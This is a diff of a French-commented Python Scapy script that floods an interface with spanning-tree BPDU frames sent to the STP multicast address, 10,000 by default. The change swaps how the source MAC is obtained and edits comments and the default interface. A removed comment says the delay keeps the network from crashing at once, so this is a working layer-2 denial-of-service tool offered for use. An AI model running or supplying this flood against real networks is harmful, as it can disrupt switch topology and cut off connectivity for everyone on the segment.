@@ -1,17 +1,11 @@
 from scapy.all import *
 import time
-import netifaces
-
-def get_mac_address(interface):
-    try:
-        return netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']
-    except KeyError:
-        print(f"Impossible de récupérer l'adresse MAC de {interface}")
-        return None
 
 def send_bpdu_flood(interface, count=10000, delay=0.01):
-    mac_src = get_mac_address(interface)
-    if not mac_src:
+    try:
+        mac_src = get_if_hwaddr(interface)
+    except Exception as e:
+        print(f"Erreur lors de la récupération de l'adresse MAC pour {interface} : {e}")
         return
 
     bpdu_packet = Ether(dst="01:80:C2:00:00:00", src=mac_src) / \
@@ -22,10 +16,10 @@ def send_bpdu_flood(interface, count=10000, delay=0.01):
 
     for _ in range(count):
         sendp(bpdu_packet, iface=interface, verbose=False)
-        time.sleep(delay)  # Pause pour éviter un crash réseau immédiat
+        time.sleep(delay)  # On évite de tout envoyer d'un coup
 
     print("Envoi terminé.")
 
 if __name__ == "__main__":
-    interface = "en0"  # Remplace par ton interface réseau
+    interface = "eth0"  # Modifie ici si besoin
     send_bpdu_flood(interface)
